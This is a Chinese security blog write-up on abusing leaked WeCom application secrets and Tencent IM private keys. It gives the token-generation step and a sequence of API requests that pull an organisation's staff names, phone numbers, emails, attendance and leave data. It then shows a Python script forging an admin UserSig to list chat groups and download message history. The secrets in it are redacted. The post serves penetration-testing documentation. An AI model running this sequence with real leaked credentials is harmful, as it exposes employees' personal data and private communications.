---
title: "企业微信+腾讯IM密钥泄漏利用"
date: 2022-03-31T08:08:03+08:00
draft: false
author: "r0fus0d"

---

遇到一个 企业微信access_token 和 腾讯IM 密钥 场景,搜了下,网上似乎没有多少公开的案例分享,有的也是比较简单的,所以简单记录一下利用过程,厚码保命,理解一下

{{% admonition info "info" %}}
本文首发 先知社区 https://xz.aliyun.com/t/11092
{{% /admonition %}}

<!--more-->

---

# 泄漏企业微信 access_token

注⚠️ :脱敏脱敏脱敏 代替 原来的敏感数据

获得的配置文件内容
```yaml
#腾讯企业微信企业id
qywx.corpid=脱敏脱敏脱敏
#腾讯企业微信管理后台的应用密钥
qywxapplet.appSecret=脱敏脱敏脱敏脱敏脱敏脱敏
#腾讯企业微信管理后台绑定的小程序appid
qywxapplet.appid=脱敏脱敏脱敏脱敏脱敏
#腾讯ocr appid,演示环境使用了腾讯的ocr接口，行方不使用腾讯ocr接口则不必配置这里。配置成"-"即可
ocr.tenc.appId=-
#腾讯ocr秘钥
ocr.tenc.secret=-
#网录制视频时分段时长，分钟，如无需求不要改动此项
duration=120
```

根据官方文档,先生成 access_token
- https://developer.work.weixin.qq.com/document/path/91039
    ```
    https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=脱敏脱敏脱敏&corpsecret=脱敏脱敏脱敏

    eQq8YjcgxHOtk39Xu4d脱敏脱敏脱敏脱敏脱敏脱敏脱敏klx38ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏
    ```

![](../../img/workwx-and-txim/1.png)

> access_token 的有效期通过返回的 expires_in 来传达，正常情况下为 7200 秒（2 小时），有效期内重复获取返回相同结果，过期后获取会返回新的 access_token。

根据官方服务,先查看 access_token 权限
- https://open.work.weixin.qq.com/devtool/query

可以看到 access_token 权限，通讯录范围 - 部门，应用权限

![](../../img/workwx-and-txim/2.png)

根据官方文档

**获取企业微信API域名IP段**

- https://developer.work.weixin.qq.com/document/path/92520

```
https://qyapi.weixin.qq.com/cgi-bin/get_api_domain_ip?access_token=eQq8YjcgxHOtk39Xu4d30脱敏脱敏脱敏脱敏脱敏脱敏脱敏lx38ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏
```

![](../../img/workwx-and-txim/3.png)

**获取部门列表**

- https://developer.work.weixin.qq.com/document/path/90208

```
https://qyapi.weixin.qq.com/cgi-bin/department/list?access_token=eQq8YjcgxHOtk39Xu4d脱敏脱敏脱敏脱敏脱敏脱敏脱敏38ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏
```

![](../../img/workwx-and-txim/4.png)

可以看到有很多部门

**获取部门成员**

- https://developer.work.weixin.qq.com/document/path/90200

```
https://qyapi.weixin.qq.com/cgi-bin/user/simplelist?access_token=eQq8YjcgxHOtk39Xu4d30rJx0脱敏脱敏脱敏脱敏脱敏脱敏脱敏LE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏&department_id=1&&fetch_child=1
```

![](../../img/workwx-and-txim/5.png)

所有人的姓名和userid，归属部门

**获取部门成员详情**

- https://developer.work.weixin.qq.com/document/path/90201

```
https://qyapi.weixin.qq.com/cgi-bin/user/list?access_token=eQq8YjcgxHOtk39Xu4d3脱敏脱敏脱敏脱敏脱敏脱敏脱敏ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏&department_id=1&fetch_child=1
```

![](../../img/workwx-and-txim/6.png)

所有人的姓名、手机号、头像、企业微信二维码、邮箱

**获取单个部门详情**

- https://developer.work.weixin.qq.com/document/path/95351

```
https://qyapi.weixin.qq.com/cgi-bin/department/get?access_token=eQq8Yjc脱敏脱敏脱敏脱敏脱敏脱敏脱敏lx38ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏&id=963233
```

查看下子部门的详情

![](../../img/workwx-and-txim/7.png)

**获取加入企业二维码**

- https://developer.work.weixin.qq.com/document/path/91714

```
https://qyapi.weixin.qq.com/cgi-bin/corp/get_join_qrcode?access_token=eQq8YjcgxHOtk3脱敏脱敏脱敏脱敏脱敏脱敏脱敏w6Owklx38ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏
```

> 仅通讯录同步助手或第三方通讯录应用可调用。

这个 accesskey 是普通应用，普通应用的secret仅有只读权限，所以不能创建成员，获取加入企业二维码也没有权限，因为这个接口也须拥有通讯录的管理权限，需要使用通讯录同步的Secret

**创建成员**

- https://developer.work.weixin.qq.com/document/path/90195

```
POST /cgi-bin/user/create?access_token=eQq8YjcgxH脱敏脱敏脱敏脱敏脱敏脱敏脱敏-w6Owklx38ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏 HTTP/1.1
Host: qyapi.weixin.qq.com
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 107

{
   "userid": "test123",
   "name": "啊啊啊",
   "department": [1],
   "mobile":"13888888888"
}
```

> 仅通讯录同步助手或第三方通讯录应用可调用。

这个 accesskey 是普通应用，普通应用的secret仅有只读权限，所以不能创建成员，获取加入企业二维码也没有权限，因为这个接口也须拥有通讯录的管理权限，需要使用通讯录同步的Secret

**获取企业所有打卡规则**

- https://developer.work.weixin.qq.com/document/path/93384

```
https://qyapi.weixin.qq.com/cgi-bin/checkin/getcorpcheckinoption?access_token=eQq8YjcgxHOtk39脱敏脱敏脱敏脱敏脱敏脱敏脱敏i-w6Owklx38ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏
```

![](../../img/workwx-and-txim/8.png)

还有 获取员工打卡规则、获取打卡记录数据、获取打卡日报数据、获取打卡月报数据、获取打卡人员排班信息,这里就不一一测试了

还有获取成员假期余额
```
POST /cgi-bin/oa/vacation/getuservacationquota?access_token=eQq8YjcgxHOtk39Xu4脱敏脱敏脱敏脱敏脱敏脱敏脱敏lx38ULE60ISuQvXMLNcsHtyNqsw3wn5hd0vM脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏 HTTP/1.1
Host: qyapi.weixin.qq.com
Connection: close
X-Forwarded-For: 101.226.129.166
Content-Type: application/json
Content-Length: 31

{
    "userid": "脱敏脱敏脱敏"
}
```

![](../../img/workwx-and-txim/9.png)

还可以修改成员假期余额，这里就不测试了
- https://developer.work.weixin.qq.com/document/path/93376
- https://developer.work.weixin.qq.com/document/path/93377

---

# 泄漏即时通信IM配置

```
qq.im.sdkappid=脱敏脱敏脱敏
qq.im.privateKey=脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏
qq.im.identifier=脱敏脱敏脱敏
qq.im.apiver=2
qq.live.bizid=脱敏脱敏脱敏
```

通过查看官方文档 https://cloud.tencent.com/document/product/269/32688 UserSig 是用户登录即时通信 IM 的密码，其本质是对 UserID 等信息加密后得到的密文，首先要生成 UserSig

https://github.com/tencentyun/qcloud-documents/blob/master/product/%E8%A7%86%E9%A2%91%E6%9C%8D%E5%8A%A1/%E5%AE%9E%E6%97%B6%E9%9F%B3%E8%A7%86%E9%A2%91/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/%E5%A6%82%E4%BD%95%E8%AE%A1%E7%AE%97UserSig.md

https://github.com/tencentyun/tls-sig-api-v2-python
```bash
pip3 install tls-sig-api-v2

vim test.py

import TLSSigAPIv2

api = TLSSigAPIv2.TLSSigAPIv2(脱敏脱敏脱敏, '脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏')
sig = api.gen_sig("脱敏脱敏脱敏")
print(sig)
```

运行生成 UserSig,注意这个 UserSig 有效期很短，一般几分钟就要重新生成一次
```
eJw1zcEKgkAUheFXkVmH3hk脱敏脱敏脱敏脱敏脱敏脱敏脱敏v-gnDdJt3u9VRVZaoTpQBbaWFCqe脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏
```

![](../../img/workwx-and-txim/10.png)

生成后按照文档里描述的填写

https://cloud.tencent.com/document/product/269/1520

获取 App 中的所有群组
```
https://console.tim.qq.com/v4/group_open_http_svc/get_appid_group_list?sdkappid=1400571601&identifier=admin&usersig=eJw1zcEKgkAU脱敏脱敏脱敏脱敏脱敏脱敏脱敏qW1iiJlr07qXp9v-gnDdJt3u9VRVZaoTpQBbaWFCqe脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏&random=99999999&contenttype=json
```

拉取运营数据
```
https://console.tim.qq.com/v4/openconfigsvr/getappinfo?sdkappid=1400571601&identifier=vc_system&usersig=eJw1zcEKgkAUheFXkVm脱敏脱敏脱敏脱敏脱敏脱敏脱敏07qXp9v-gnDdJt3u9VRVZaoTpQBbaWFCqe脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏&random=99999999
```

下载最近消息记录
```
https://console.tim.qq.com/v4/open_msg_svc/get_history?sdkappid=1400571601&identifier=vc_system&usersig=eJw1zcEKgkAU脱敏脱敏脱敏脱敏脱敏脱敏脱敏p9v-gnDdJt3u9VRVZaoTpQBbaWFCqe脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏&random=99999999&contenttype=json
```

获取服务器 IP 地址
```
https://console.tim.qq.com/v4/ConfigSvc/GetIPList?sdkappid=1400571601&identifier=vc_system&usersig=eJw1zcEKgkAUheFXkVmH3hk脱敏脱敏脱敏脱敏脱敏脱敏脱敏9v-gnDdJt3u9VRVZaoTpQBbaWFCqe脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏脱敏&random=99999999&contenttype=json
```

可以用在线网页进行验证
https://tcc.tencentcs.com/im-api-tool/index.html#v4/group_open_http_svc/get_appid_group_list
